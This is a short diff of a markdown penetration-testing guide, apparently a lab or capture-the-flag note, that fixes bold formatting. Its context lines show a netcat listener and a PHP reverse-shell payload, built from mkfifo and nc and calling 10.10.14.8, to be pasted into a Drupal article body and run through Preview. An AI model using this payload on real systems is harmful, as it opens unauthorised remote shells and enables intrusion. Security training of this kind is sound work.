@@ -22,7 +22,7 @@ Then listen in a port of your choosing :
 nc -lvnp 443
 ```
 
-Afterward in the Drupal Article **Body **add this payload:
+Afterward in the Drupal Article **Body** add this payload:
 
 ```bash
 <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f"); ?>
@@ -30,7 +30,7 @@ Afterward in the Drupal Article **Body **add this payload:
 
 Next, in the **Text Format**, we select **PHP code.**
 
-Finally, we click on the **Preview **button.
+Finally, we click on the **Preview** button.
 
 ## Drupal Exploits
 
